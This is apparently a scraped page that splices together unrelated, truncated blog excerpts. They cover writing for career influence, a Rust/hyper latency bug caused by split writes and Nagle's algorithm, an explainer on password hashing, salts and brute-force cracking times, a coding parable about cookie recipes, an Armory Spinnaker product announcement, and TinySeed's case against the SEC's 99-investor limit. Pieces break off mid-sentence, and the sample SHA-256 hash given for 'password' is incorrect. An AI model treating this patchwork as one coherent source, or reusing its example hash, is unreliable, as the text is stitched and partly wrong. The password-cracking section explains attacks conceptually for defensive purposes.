<p>So few people achieve the level of External Influencer that just attempting this sort of writing puts you in a tiny, standout class of people. Unlike the External Teacher, who sticks to irrefutable facts and rehashes of existing knowledge, the External Influencer has a strong point of view. They write from deep experience, and their writing influences the decisions that others make.</p>
<p>Some of the External Influencers you’ve probably heard of include <a href="https://martinfowler.com/">Martin Fowler</a>, <a href="http://cleancoder.com/products">“Uncle” Bob Martin</a>, and <a href="https://domainlanguage.com/">Eric Evans</a>. When they write something, thousands of programmers listen, and their books have shaped decades of software architecture.</p>
<p>There are degrees to all the influence levels in this model. You don’t have to be Uncle Bob to be an External Influencer; you just need to start applying your technical experience to larger business challenges in a public forum. For example, Eric Evans created Domain-Driven Design to help businesses build better software by making it more closely resemble the underlying domain model. If you’ve spent years solving a particular set of problems, you probably have at least a few issues you could get on a soapbox about. These are likely your platform for becoming an External Influencer.</p>
<p>While it sounds great, acting like an External Influencer is even scarier than being an External Teacher. Not only does your writing have to be factually accurate and coherent, but you’re also opening your ideas to public criticism. Nobody likes to get slammed on the internet, but the upside can be huge if your work is well-received. Do you think Martin Fowler would ever have trouble getting a job if he decided to leave ThoughtWorks? I’m pretty sure he could (literally) write his own job description just about anywhere.</p>
<h2 id="write-above-your-level">Write Above Your Level</h2>
<p>By this point, I hope I’ve convinced you that influence is an important part of advancing your software development career and that writing can help you gain this influence. My final encouragement to engineers who want to become better writers is to push beyond your current level. It will be uncomfortable, but it’s also one of the best ways to take control of your career. <a href="https://twitter.com/karllhughes">Let me know if I can help</a>.</p>

<p>This is a small story about tracking down a production bug in a Rust
application. I don’t know if there’s any take away from this one for the reader,
but it felt interesting so I’m sharing it.</p>

<h2 id="a-bit-of-backstory">A bit of backstory</h2>

<p>In Avast, we have a Rust application called <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It serves as a backend to
some other applications, provides them a HTTP API. It’s in Rust because it is
latency critical. Latencies of most requests are under a millisecond.</p>

<p>It was written with <a href="https://docs.rs/tokio/0.1.*"><code>tokio-0.1</code></a> and <a href="https://docs.rs/hyper/0.12.*"><code>hyper-0.12</code></a> to deal with the HTTP. We
were quite late to update to newer versions, in part because it worked fine and
the amount of <code>async</code> code was single quite short function, so we didn’t have
much motivation. And in part because we use the <a href="https://crates.io/crates/spirit"><code>spirit</code></a> libraries for
configuration. It’s a library to take configuration and set up the internal
state of the program for it ‒ configuration contains the ports to listen to,
etc, and it manages spawning the HTTP server objects inside the program and can
even migrate from one set of ports to other at runtime.</p>

<p>But migrating <a href="https://crates.io/crates/spirit"><code>spirit</code></a> to newer <code>tokio</code> and <code>hyper</code> was a big task (because
the API surface is quite large, the library does a bit unusual things compared
to all the usual applications and the change between old and new <code>tokio</code> was
quite large).</p>

<p>Anyway, eventually I got permission to work on the migration of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> as
part of my job. It took about a week to migrate both <a href="https://crates.io/crates/spirit"><code>spirit</code></a> and <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It
went through review, went through the automatic tests and we put it to the
staging environment for a while, watching the logs and graphs. Everything seemed
fine, so after few days of everything looking fine, we pushed the button and put
it to production.</p>

<h2 id="the-increased-latencies">The increased latencies</h2>

<p>As it goes in these kinds of stories, by now you’re expecting to see what went
wrong.</p>

<p>The thing is, our own metrics and graphs were fine. But the latency on the
downstream service querying us increased by 40ms. The deployment got reverted,
and we started to dig into where these latencies come from.</p>

<h2 id="it-was-acting-really-weird">It was acting really weird</h2>

<p>There were several very suspicious things about that.</p>

<ul>
  <li>Our own „internal“ latencies stayed the same. Our CPU usage also stayed the
same.</li>
  <li>The latency graph on the downstream side was flat 40ms <em>constant</em>.</li>
</ul>

<p>Now, if we introduced some performance regression in the query handling, we
would expect our CPU consumption to rise. We would also expect the latency graph
to be a bit spiky, not completely flat 40ms constant. It almost looked like
there was a 40ms <code>sleep</code> somewhere. But why would anyone put a 40ms sleep
anywhere?</p>

<p>I’ve looked through documentation and didn’t see anything obvious. I’ve tried
searching both our code and code of the dependencies for <code>40</code>, asked on Slack if
that <code>40ms</code> value was familiar to anyone. Nothing.</p>

<p>The working theory we started with was that there could be some kind of back-off
sleep on some kind of failure. Maybe <code>hyper</code> would be closing inactive
connections in the new version, forcing the application to reconnect (the graph
was for 99th percentile, so if we happened to close each 100th connection and
reconnection took this long…) and maybe try IPv6 first and we would be listening
on IPv4 only or… (in other words, we didn’t have a clear clue).</p>

<h2 id="the-benchmarks">The benchmarks</h2>

<p>My colleague started to investigate in a more thorough way than just throwing
ideas around on Slack. He run a <code>wrk</code> benchmark against the service. On his
machine, the latencies were fine. So he commandeered one of the stage nodes to
play with it and run the benchmark there. And every request had 40ms latency on
that machine. The previous version of <code>urlite</code> was fine, with under one
millisecond.</p>

<p><em>Something</em> was probably sleeping somewhere on the production servers, but not
on the development machine. There probably was some difference in the OS
settings, but definitely difference in the kernel version. The servers are
running some well-tried Linux distribution, so they have a lot older version,
while a developer is likely to run something much more on the edge.</p>

<h2 id="configuration-options">Configuration options</h2>

<p>The selling point of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> is that most of the thing one can set in the
builders of various libraries and types now can be just put into a config file
without any recompilation. If we did configuration by hand, we would expose only
the things we thought would be useful, but with spirit, there’s everything. So,
naturally, tweaking some of the config knobs was the next step (because it was
easy to do).</p>

<p>It was discovered that turning the <code>http1-writev</code> option <em>off</em>, which
corresponds to
<a href="https://docs.rs/hyper/0.13.8/hyper/server/struct.Builder.html#method.http1_writev">this method</a>
in <code>hyper</code>, made the latencies go away.</p>

<p>We now had a solution, but I wasn’t happy about not understanding <em>why</em> that
helped, so I went to dig the rabbit hole and find the root cause. Turns out
there were several little things in just the constellation to make the problem
manifest.</p>

<h2 id="overriding-the-defaults-of-http1_writev">Overriding the defaults of <code>http1_writev</code></h2>

<p>The method controls the strategy in which way data are pushed into the socket.
With vectored writes enabled, it sends two separate buffers (one with headers,
the other with the body if it’s small enough) through a single <a href="https://linux.die.net/man/2/writev"><code>writev</code></a>
syscall.  If they are disabled, <code>hyper</code> copies all the bytes into a single
buffer and sends that as a whole.</p>

<p>It turns out that the method takes a <code>bool</code>, but there are actually 3 states.
The third (auto) is signalled by <em>not</em> calling the method and <code>spirit-hyper</code> was
calling it always, with the default to turn the <a href="https://linux.die.net/man/2/writev"><code>writev</code></a> on. I don’t know if
leaving it on auto would make the bug go away, but I’ve fixed the problem in the
library anyway.</p>

<h2 id="splitting-vectored-writes">Splitting vectored writes</h2>

<p>Spirit wants to support a bit of configuration on top of what the underlying
libraries provide on their own. One of such things is limiting the number of
concurrently accepted connections on a single listening socket. Users don’t have
to take advantage of that (the types for the configuration can be composed
together to either contain that bit or not and the administrator may leave the
values for the limits unset in the configuration and then they won’t be
enforced).</p>

<p>Anyway, in case the support for the limits is opted in through using the type
with the configuration fields, the connections themselves are wrapped in a
<a href="https://docs.rs/spirit-tokio/0.7.*/spirit_tokio/net/limits/struct.Tracked.html"><code>Tracked</code></a>
type. The type tries to be mostly transparent for use and can be used inside
<code>hyper</code> (which is what the default configuration type alias in <code>spirit-hyper</code>
does), but tracks how many connections there are, to not accept more if it runs
out of the limit.</p>

<p>When implementing the bunch of traits for the wrapper, I’ve overlooked the
<a href="https://docs.rs/tokio/0.2.*/tokio/io/trait.AsyncWrite.html#method.poll_write_buf"><code>AsyncWrite::poll_write_buff</code></a>.
It is a provided method, which means it has a default implementation. It is the
one that abstracts the OS-level <code>writev</code>, it can write multiple buffers (the
<a href="https://docs.rs/bytes/0.5.*/bytes/buf/trait.Buf.html"><code>Buf</code></a> represents a
segmented buffer).</p>

<p>The default implementation simply delegates to multiple calls to the ordinary
write. Therefore, this omission combined with the default of enabling vectored
writes results in calling into the kernel twice, each time with a small buffer,
instead of once with two small buffers or once with a big buffer.</p>

<p>That was definitely something to get fixed, because if nothing else, syscalls
are expensive and calling more of them is not great. But I’ve finally felt like
I’m on the right path, because:</p>

<h2 id="nagles-algorithm">Nagle’s algorithm</h2>

<p>You probably know that TCP stream is built from packets going there and back.
Optimizing how to split the stream into the packets and when to send them is a
hard problem and the research in that area is still ongoing, because there are
many conflicting requirements. One wants to deliver the data with low latency,
utilize the whole bandwidth, but not overflow the capacity of the link (in which
case the latencies would go up or packets would get lost and would have to be
retransmitted), leave some bandwidth to other connections, etc.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Nagle%27s_algorithm">Nagle’s algorithm</a> is
one of the older tricks up in TCP’s sleeve. The network doesn’t like small
packets.  It is better to send as large packets as the link allows, because each
packet has certain overhead ‒ the headers that take some space, but also routers
spend computation power mostly based on number of packets and less on their
size. If you start sending a lot of tiny packets, the performance will suffer.
While the links are limited by the number of bytes that can pass through them,
routers are more limited by the number of packets. If a router declares to be
able to handle a gigabit connection, it actually means a gigabit <em>if you use
full-sized packets</em>, but will get to few megabits if you split the data into
tiny packets.</p>

<p>So it would be better to wait until the send buffer contains a packetfull of
data before sending anything. But we can’t do that, because we don’t <em>know</em>
there’ll ever be a full packet of data, or generating more data might wait for
the other side to answer. We would never send anything and wait forever and the
Internet would not work.</p>

<p>Instead, the algorithm is willing to send <em>one</em> undersized packet and then it
waits for an <code>ACK</code> from the other side until sending another undersized one. If
it gets a packetfull of data to send in the meantime, that’s great and it sends
it (it won’t get better by waiting longer), but it won’t ever have two
undersized ones somewhere in flight, therefore won’t kill the network’s
performance by them.</p>

<p>This works, it’ll make progress eventually because once the <code>ACK</code> comes and
all the data that accumulated until then is sent.</p>

<p>But it also slows things down. Like in our case. What happens if we do it using
single syscall, the whole HTTP response forms a single undersized packet (we
have really small answers) and gets sent, no matter if it’s submitted to the
kernel by one big or two small buffers.</p>

<p>On the other hand, if we split the submission into two syscalls, this is what
happens:</p>

<ul>
  <li>We write the first part (headers). The kernel sends them out as an undersized
packet.</li>
  <li>We write the second part (the body). But the kernel shelves them into the send
buffer and waits for sending them until it sees the <code>ACK</code>, because there’s one
undersized packet …</li></ul></section></div></div>

              <p>Here’s the reality, billions of credentials have been leaked or stolen and are now easily downloaded online by anyone. Many of these databases of identities include passwords in plain text, while others are one-way hashed. One-way hashing is better (we’ll get to why in a second), but it is only as secure as is mathematically feasible. Let’s take a look at one-way hashing algorithms and how computers handle them.</p>

<h2 id="hashing">Hashing</h2>

<p>A hash by definition is a function that can map data of an arbitrary size to data of a fixed size. SHA2 is a hashing algorithm that uses various bit-wise operations on any number of bytes to produce a fixed sized hash. For example, the SHA-256 algorithm produces a 256 bit result. The algorithm was designed specifically so that going from a hash back to the original bytes is infeasible. Developers use an SHA2 hash so that instead of storing a plain text password, they instead only store the hash. When a user is authenticated, the plain text password they type into the login form is hashed, and because the algorithm will always produce the same hash result given the same input, comparing this hash to the hash in the database tells us the password is correct.</p>

<h2 id="cracking-passwords">Cracking Passwords</h2>

<p>While one-way hashing means we aren’t storing plain text passwords, it is still possible to determine the original plain text password from a hash. Next, we’ll outline the two most common approaches of reversing a hash.</p>

<h3 id="lookup-tables">Lookup Tables</h3>

<p>The first is called a lookup table, or sometimes referred to as a rainbow table. This method builds a massive lookup table that maps hashes to plain text passwords. The table is built by simply hashing every possible password combination and storing it in some type of database or data-structure that allows for quick lookups.</p>

<p>Here’s an example of a lookup table for SHA2 hashed passwords:</p>

<p>Using a lookup table, all the attacker needs to know is the SHA2 hash of the password and they can see if it exists in the table. For example, let’s assume for a moment that Netflix stores your password using an SHA2 hash. If Netflix is breached, their user database is likely now available to anyone with a good internet connection and a torrent client. Even a mediocre hacker now only needs to lookup the SHA2 hash associated with your Netflix account to see if it exists in their lookup table. This will reveal nearly instantly what your plain text password is for Netflix. Now, this hacker can log in to your Netflix account and binge watch all four seasons of Fuller House (“how rude!”). And he can also try this password on Hulu and HBO Go to see if you used the same email address and password for those accounts as well.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/salt.png" alt="Salt"></p>

<p>The best way to protect against this type of attack is to use what is called a <strong>salt</strong>. A salt is simply a bunch of random characters that you prepend to the password before it is hashed. Each password should have a different salt, which means that a lookup table is unlikely to have an entry for the combination of the salt and the password. This makes salts an ideal defense against lookup tables.</p>

<p>Here’s an example of a salt and the resulting combination of the password and the salt which is then hashed:</p>

<div><div><pre><code><span>// Bad, no salt. Very bland.</span>
<span>sha2</span><span>(</span><span>"password"</span><span>)</span> <span>// 6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e</span>

<span>// Better, add a salt.</span>
<span>salt</span> <span>=</span> <span>";L'-2!;+=#/5B)40/o-okOw8//3a"</span>
<span>toHash</span> <span>=</span> <span>";L'-2!;+=#/5B)40/o-okOw8//3apassword"</span>
<span>sha2</span><span>(</span><span>toHash</span><span>)</span> <span>// f534e6bf84a638112e07e69861927ab624c0217c0655e4d3be07659bcf6c1c07</span>
</code></pre></div></div>

<p>Now that we have added the salt, the “password” that we actually generated the hash from was the String <code>;L'-2!;+=#/5B)40/o-okOw8//3apassword</code>. This String is long, complex and contains a lot of random characters. Therefore, it is nearly impossible that the hacker that created the lookup table would have generated the hash for the String <code>;L'-2!;+=#/5B)40/o-okOw8//3apassword</code>.</p>

<h3 id="brute-force">Brute Force</h3>

<p><img src="https://fusionauth.io/assets/img/blogs/hulk.png" alt="Brute Force"></p>

<p>The second method that attackers use to crack passwords is called brute force cracking. This means that the attacker writes a computer program that can generate all possible combinations of characters that can be used for a password and then computes the hash for each combination. This program can also take a salt if the password was hashed with a salt. The attacker then runs the program until it generates a hash that is the same as the hash from the database. Here’s a simple Java program for cracking passwords. We left out some detail to keep the code short (such as all the possible password characters), but you get the idea.</p>

<p>This program will generate all the possible passwords with lengths between 6 and 8 characters and then hash each one until it finds a match. This type of brute-force hacking takes time because of the number of possible combinations.</p>

<h2 id="password-complexity-vs-computational-power">Password complexity vs. computational power</h2>

<p>Let’s bust out our TI-85 calculators and see if we can figure out how long this program will take to run. For this example we will assume the passwords can only contain ASCII characters (uppercase, lowercase, digits, punctuation). This set is roughly 100 characters (this is rounded up to make the math easier to read). If we know that there are at least 6 characters and at most 8 characters in a password, then all the possible combinations can be represented by this expression:</p>

<div><div><pre><code>possiblePasswords = 100^8 + 100^7 + 100^6
</code></pre></div></div>

<p>The result of this expression is equal to <code>10,101,000,000,000,000</code>. This is quite a large number, North of 10 quadrillion to be a little more precise, but what does it actually mean when it comes to our cracking program? This depends on the speed of the computer the cracking program is running on and how long it takes the computer to execute the SHA2 algorithm. The algorithm is the key component here because the rest of the program is extremely fast at creating the passwords.</p>

<p>Here’s where things get dicey. If you run a quick Google search for <a href="http://lmgtfy.com/?q=fastest+bitcoin+rig">“fastest bitcoin rig”</a> you’ll see that these machines are rated in terms of the number of hashes they can perform per second. The bigger ones can be rated as high as <code>44 TH/s</code>. That means it can generate 44 tera-hashes per second or <code>44,000,000,000,000</code>.</p>

<p>Now, if we divide the total number of passwords by the number of hashes we can generate per second, we are left with the total time it takes a Bitcoin rig to generate the hashes for all possible passwords. In our example above, this equates to:</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^8 + 100^7 + 100^6 = 1.0101e16

numberOfSeconds = possiblePasswords / bitcoinRig = ~230
numberOfMinutes = numberOfSeconds / 60 = ~4
</code></pre></div></div>

<p>This means that using this example Bitcoin rig, we could generate all the hashes for a password between 6 and 8 characters in length in roughly 4 minutes. Feeling nervous yet? Let’s add one additional character and see long it takes to hash all possible passwords between 6 and 9 characters.</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^9 + 100^8 + 100^7 + 100^6 = 1.010101E18

numberOfSeconds = possiblePasswords / bitcoinRig = 22,956
numberOfMinutes = numberOfSeconds / 60 = ~383
numberOfHours = numberOfMinutes / 60 = ~6
</code></pre></div></div>

<p>By adding one additional character to the potential length of the password we increased the total compute time from 4 minutes to 6 hours. This is nearing a 100x increase in computational time to use the brute force strategy. You probably can see where this is going. To defeat the brute force strategy, you simply need to make it improbable to calculate all possible password combinations.</p>

<p>Let’s get crazy and make a jump to 16 characters:</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^16 + 100^15 ... 100^7 + 100^6 = 1e32

numberOfSeconds = possiblePasswords / bitcoinRig = 2.27e18
numberOfMinutes = numberOfSeconds / 60 = 3.78e16
numberOfHours = numberOfMinutes / 60 = 630,000,000,000,000 or 630 trillion
numberOfDays = numberOfHours / 24 = 26,250,000,000,000 or 26.25 trillion days
numberOfYears = numberOfDays / 365 = 71,917,808,219 or 71.9 billion years
</code></pre></div></div>

<p>To boil down our results, if we take these expressions and simplify them, we can build an equation that solves for any length password.</p>

<div><div><pre><code>numberOfSeconds = 100^lengthOfPassword / computeSpeed
</code></pre></div></div>

<p>This equation shows that as the password length increases, …</p></div></div>

As it tends to do, time continues to move on.  The project and code in
it eventually becomes legacy code (aka, someone else's problem to
maintain).
</p>

<p>
One day, the business drudges up that old automated cookie creation
idea and requests that it handles a new task - "instead of just cooking
peanut butter cookies, it'd be great if the cookie system could handle
oatmeal raisin as well!".
</p>

<p>
Hah!  You remember that old system, but you're onto newer and better
things.  This is a perfect task for the intern to sink their teeth
into - afterall, it's legacy and not high profile, it's been stable,
and it was so simple to implement the first time around.
</p>

<p>
The new set of requirements/recipe the intern works off of looks very
similar to the initial ones:
</p>

<ul>
<li>Step 1: Preheat oven to 325F, grease cookie sheet</li>
<li>Step 2: In bowl, stir oats, pumpkin puree and sugar until smooth.</li>
<li>Step 3: Beat in one egg white, then stir in baking soda, salt, and cinnamon.</li>
<li>Step 4: Roll dough into 1 inch balls and place 2 inches apart on the sheet.</li>
<li>Step 5: Bake for 8 minutes, cool for 5, enjoy!</li>
</ul>

<p>
He eagerly begins to expand the original code to handle the new case:
</p>

<div>
<pre><span>function</span> <span>makeCookies</span> <span>(</span><span>type</span> = <span>'peanut-butter'</span><span>)</span> <span>{</span>

  sheet.cool<span>(</span>5<span>)</span>

  <span>return</span> cookies
<span>}</span>
</pre>
</div>

<p>
The code comes in, the peer reviews pass it as it meets the
requirements and nothing is obviously wrong.  Still, it has become a
bit harder to understand and you're left with a nagging feeling.

            <div><figure><img width="800" height="303" src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.00.15-PM-e1605597986841.png" alt="" loading="lazy"></figure></div>            <div>
                
                <h2><b>Armory, Spinnaker, and Kubernetes</b></h2>
<p><span>We are excited to announce that Armory now provides a K8s-native continuous delivery experience from end-to-end, unlocking Kubernetes deployments in the enterprise at massive scale. As a cloud-native, multi-cloud CD platform, Spinnaker has always been a powerful tool for deploying to Kubernetes. In fact, AWS and Google engineering teams helped to build the </span><a href="https://www.armory.io/blog/deep-dive-into-clouddriver/"><span>Spinnaker Clouddrivers</span></a><span> for deploying to EKS and GKE, and Spinnaker powers more than </span><b>8 million monthly K8s deployments</b><span>.&nbsp;</span></p>
<p><img loading="lazy" data-src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.09.28-PM-768x410.png" alt="" width="631" height="337" src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.09.28-PM-768x410.png"></p>
<p><em>Monthly OSS Spinnaker deployments to K8s are up 5x since April.</em></p>
<p><span>Armory is enhancing Spinnaker by introducing a familiar Kubernetes workflow, eliminating context-switching and domain-specific languages, and helping Spinnaker scale deployments to thousands of Kubernetes clusters.</span></p>
<h2><b>Day 0: The Armory Operator</b></h2>
<p><span>The </span><a href="https://www.armory.io/blog/announcing-the-spinnaker-kubernetes-operator/"><span>Armory Operator</span></a><span> is a Kubernetes operator for implementing and managing Spinnaker, bringing a Kubernetes-native GitOps workflow to managing Spinnaker’s full lifecycle. With the Operator, you treat Spinnaker as simply another Kubernetes deployment, installing, managing, and upgrading it with familiar tools such as <code>kubectl</code> and <code>kustomize</code>. Install Spinnaker with just a few keystrokes, and upgrade your Spinnaker version simply by changing the version number in a config file and applying. Access to other Kubernetes features, such as Kubernetes Secrets, also comes enabled out of the box.</span></p>
<p><span>The Operator also unlocks the scalability and security of a GitOps workflow by defining all of your Spinnaker configs as code and centralizing them in a single Git repo. This enables collaborative code reviews on all config changes to ensure that Spinnaker is stable and secure. Pre-flight validation of all changes adds a further layer of safety. In the event of a bad update, built-in config version control allows for rapid rollbacks and auditability.</span></p>
<p><span>The Operator is available for both Armory and open source Spinnaker.</span></p>
<h2><b>Building your Deployment Pipelines: PaCRD</b></h2>
<p><a href="https://docs.armory.io/docs/spinnaker-user-guides/pacrd/"><span>PaCRD</span></a><span> (a combination of “</span><a href="https://www.armory.io/armory-enterprise-spinnaker/pipelines-as-code-gitops/"><span>Pipelines as Code</span></a><span>” and “</span><a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/"><span>Custom Resource Definition</span></a><span>”) is a Kubernetes controller that manages the lifecycle of Spinnaker applications and pipelines as objects within your K8s cluster. PaCRD extends Kubernetes functionality to support Spinnaker Application and Pipeline objects that can be observed for changes through a mature lifecycle management API.</span></p>
<p><span>With PaCRD you can:</span></p>
<ul>
<li><span>Maintain your Spinnaker pipelines as code with the rest of your Kubernetes manifests.</span></li>
<li><span>Persist Pipeline and Application changes with confidence to your Spinnaker cluster.</span></li>
<li><span>Leverage existing tools <code>helm</code> and <code>kustomize</code> to template your pipelines across teams and projects.</span></li>
</ul>
<p><span>Pipelines as Code is one of Armory’s most powerful features. It brings security and repeatability to your application deployments by enabling you to templatize and share pre-blessed pipelines that are up-to-date with your organizational best practices and security &amp; compliance policies. With PaCRD, we are providing another method for accessing those benefits, but with a K8s-native workflow and some additional Kubernetes functionality.</span></p>
<p><span>PaCRD is available as an early release feature with select </span><a href="https://www.armory.io/armory-design-partners/"><span>Armory Design Partners</span></a><span>.&nbsp;</span></p>
<h2><b>Deployment to Production: The Armory Agent for Kubernetes&nbsp;</b></h2>
<p><span>Spinnaker is the tool of choice for hundreds of the world’s leading enterprises to deploy to Kubernetes. The </span><a href="https://www.armory.io/armory-enterprise-spinnaker/armory-agent-for-kubernetes/"><span>Armory Agent for Kubernetes</span></a><span> adds further scalability and security to Kubernetes deployments on Spinnaker, unlocking enterprise use cases at the highest scale as you expand your Kubernetes footprint. With the Agent, you can deploy to thousands of Kubernetes clusters as easily as you deploy to two.&nbsp;</span></p>
<p><span>The Agent acts as a highly performant and efficient Kubernetes controller on behalf of Spinnaker’s Clouddriver service. Its distributed, optimized caching model eliminates latency and accelerates pipeline execution times, while its decentralized account management design enhances security and enables individual teams to manage permissions for their specific clusters. These security and account management features are also enabling </span><a href="https://www.armory.io/armory-cloud/"><span>Armory Cloud</span></a><span>, a SaaS version of the Armory Platform that is currently in early release (request early access </span><a href="https://www.armory.io/armory-cloud-signup/"><span>here</span></a><span>).&nbsp;&nbsp;</span><img loading="lazy" data-src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-768x478.png" alt="" width="591" height="368" srcset="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-768x478.png 768w, https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-1024x637.png 1024w, https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-360x224.png 360w, https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM.png 1164w" sizes="(max-width: 591px) 100vw, 591px" src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.30.53-PM-768x478.png"></p>
<p><em>The Armory Agent in Agent mode (other modes available).</em></p>
<h2><b>The Proof Is in the Pudding</b></h2>
<p><span>Spinnaker today handles millions of Kubernetes deployments from thousands of users, and that number will only continue to accelerate with the new features Armory has been rolling out to our customers and the broader community. Here are what some of those customers have to say:</span></p>
<blockquote><p><i><span>“The Armory platform has been a huge upgrade over our existing tooling in helping us quickly roll out innovative solutions with confidence. As a cloud-native continuous delivery platform designed for scale in a microservices world, Armory has helped OpenGov scale up from twenty to more than a hundred Kubernetes services.”</span></i></p>
<p><span>– Ashwani Wason, VP of Engineering &amp; Operations at OpenGov</span></p></blockquote>

<blockquote><p><i><span>“With Armory’s help, we’ve scaled up Spinnaker to support daily deployments to 30+ Kubernetes clusters and multiple environments.”</span></i></p>
<p><span>– Paul Selden, Principal Engineer at OpenX</span></p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e7b2ccadd106c01a49f9"><div><h3>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>, <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</h3><p>At TinySeed, we are in the process of <a href="https://tinyseed.com/latest/invest">raising the second fund</a> for our SaaS accelerator, and we’re often asked why we have such a high minimum investment. If an <a href="https://www.investopedia.com/terms/a/accreditedinvestor.asp">accredited investor</a> wants to put in $50,000, why would we turn them down?&nbsp;</p><p>It all comes down to SEC regulations, which limit funds like ours to a maximum of 99 accredited investors. In order to raise the amount of capital required to execute on <a href="https://tinyseed.com/thesis">our investment thesis</a>, we must enforce a (relatively) high minimum investment.&nbsp;</p><p>We didn’t write this article to complain about our situation, as <a href="https://tinyseed.com/invest">fundraising (even with this minimum in place) is going quite well</a>.

The qualified purchaser, or QP, definition is a significant increase in the required net worth compared to accredited investors.</p><h3>Why can’t investors pool their money and create a single entity to invest?</h3><p>The SEC stipulates that accredited investors cannot pool their money and create a single entity (for example through an SPV) to invest in the fund – the SEC will “look through” this entity and count the number of investors there as long as the entity was created for the purpose of making a specific investment.&nbsp;</p><h3>Why can’t we create parallel funds?</h3><p>Another often suggested option, to run several parallel funds that co-invest, is also forbidden, as the SEC will count as a single fund, any set of funds that a reasonable investor would deem to be identical.</p><h3>One burdensome option: The “QP sleeve”</h3><p>The only exception to the above is what’s sometimes referred to as a “QP sleeve”. A 3(c)(1) fund may operate in parallel with a separate 3(c)(7) fund. This does add significant overheads, but frees up some slots for accredited investors by moving the qualified purchasers into the 3(c)(7) (of which there can be 1999).</p><h3>The recent JOBS act</h3><p>A more recent change was introduced with the JOBS act, which expanded the ability of fund managers to promote their offerings publicly, with the trade-off that doing so would tighten the requirement to verify that all investors were in fact accredited investors (a 506c offering). We think these changes are laudable, as they increase awareness of specific offerings among accredited investors while also adding further, appropriate, protections.</p><h2>Recent regulatory efforts to expand investment opportunities, harmonize regulations with other jurisdictions and further capital formation</h2><p>&nbsp;The SEC very recently issued updated accredited investor definitions: </p><blockquote><p>For the first time, individuals will be permitted to participate in our private capital markets not only based on their income or net worth, but also based on established, <strong><em>clear measures of financial sophistication</em></strong>.</p></blockquote><p>(Emphasis ours.)</p><p>We salute this change, and even though we think the SEC has further to go in terms of widening the definition of accredited investors, it’s a great first step. This change is well inline with the SECs ongoing efforts to “simplify, harmonize, and improve the exempt offering framework, thereby expanding investment opportunities while maintaining appropriate investor protections and promoting capital formation.”</p><p><strong>&nbsp;However, we believe that the current limit of 99 accredited investors per 3(c)(1) fund runs counter to these efforts.</strong></p><h2>The many downsides of the 99 accredited investor limit</h2><p>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>,&nbsp; <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</p><ul data-rte-list="default"><li><p>A fund manager can accept smaller checks from wealthier individuals, as the higher QP limit in the sleeve means that there is effectively no minimum amount required of those individuals. </p></li><li><p>Conversely, and perversely, a fund manager looking to raise a more substantial fund is forced to ask for larger checks from the less wealthy investor, or keep that investor out of the fund entirely.</p></li></ul><p><strong>This is far from ideal and, in our experience, excludes sophisticated investors from being allowed to invest in funds like ours. </strong>In some cases these excluded investors have a deep understanding of the industry being invested into, and perhaps with atypical backgrounds as far as fund investors go. <strong>We do not believe those kinds of investors should be effectively excluded from making these kinds of investments.</strong></p><p>Instead what happens is that as funds grow from very small (sub $10m) they are forced to seek capital from larger, institutional investors like Fund of Funds, Endowments and various Family Offices.</p><p><strong>While these more institutional LPs are a fine source of capital, it’s undoubtedly true that they are more risk averse and in general prone to relying on a proven track record for the managers they back.&nbsp;</strong></p><p>A great example of this is the University of Texas’ (laudable) Emerging Managers Program. This is a program setup explicitly to support new (aka emerging) managers, though the criteria for selection includes:</p><ul data-rte-list="default"><li><p>Attributable track record within target strategy</p></li><li><p>Investment teams with history of working together</p></li><li><p>Principals known in the investment community and are positively referenceable</p></li></ul><p><strong>Clearly, such terms favor managers that “emerge” from existing funds.</strong> This means that the type of general partners that more easily get backing from these kinds of investors are of the same mold as GPs that already exist.<strong> New and diverse GPs with novel ways to invest are effectively locked into staying small or violating SEC rules.</strong></p><h2>Proposed solution: <br><strong>Allow as many Accredited Investors as Qualified Purchasers.</strong></h2><p>The oversight of private funds is light by definition, so we fully understand why the SEC imposes a limit on the number of investors. Without a limit, a fraudulent fund could become a significant issue if tens or hundreds of thousands of investors could invest.&nbsp;</p><p><strong>However, we feel the unintended consequences of concentrating wealth creation to only super high net worth individuals or institutional investors with the 99 Accredited Investors limit is not the right trade-off in this regard.</strong> We propose that private funds relying on the 3(c)(1) exemption should be allowed to admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are in fact accredited (something that is already a requirement for a 506c offering.)</p><h3><strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a 